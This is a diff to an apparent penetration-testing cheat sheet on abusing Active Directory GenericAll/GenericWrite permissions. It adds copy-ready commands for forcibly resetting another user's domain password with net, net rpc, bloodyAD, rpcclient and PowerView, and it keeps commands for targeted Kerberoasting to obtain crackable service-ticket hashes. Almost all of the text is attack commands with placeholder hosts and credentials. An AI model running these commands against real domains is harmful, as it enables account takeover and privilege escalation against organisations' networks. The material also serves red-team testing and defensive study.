@@ -8,11 +8,26 @@
 
 ### GenericAll / GenericWrite
 
-#### 1) Change Password
+#### 1) Windows net command
+
+Change the password of a user
 
     net user USER PASSWORD /domain
 
-#### 2) Targeted Kerberoasting (add SPN)
+#### 2) Linux Net RPC - Samba 
+
+    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP   
+
+#### 3) BloodyAD
+
+    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@9876"
+
+#### 4) Rpcclient
+
+    rpcclient -U domain.local/USER1 DC_IP
+    rpcclient $> setuserinfo TARGET_USER 23 "Password@9876"
+
+#### 5) Targeted Kerberoasting (add SPN)
 
     targetedKerberoast.py -d DOMAIN -u USER -p PASS (TGS Hash)
 
@@ -28,6 +43,17 @@
 
     Get-DomainSPNTicket -SPN nonexistent/WHATEVER (Powerview)
 
-#### 3) Logon Script (Access)
+#### 6) Logon Script (Access)
 
-#### 4) add Key Credentials (Shadow Credentials)
+#### 7) add Key Credentials (Shadow Credentials)
+
+#### 8) Powerview
+
+    $SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('domain.local\TARGET_USER', $SecPassword)
+
+#### 9) Windows PowerShell
+
+    $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
+
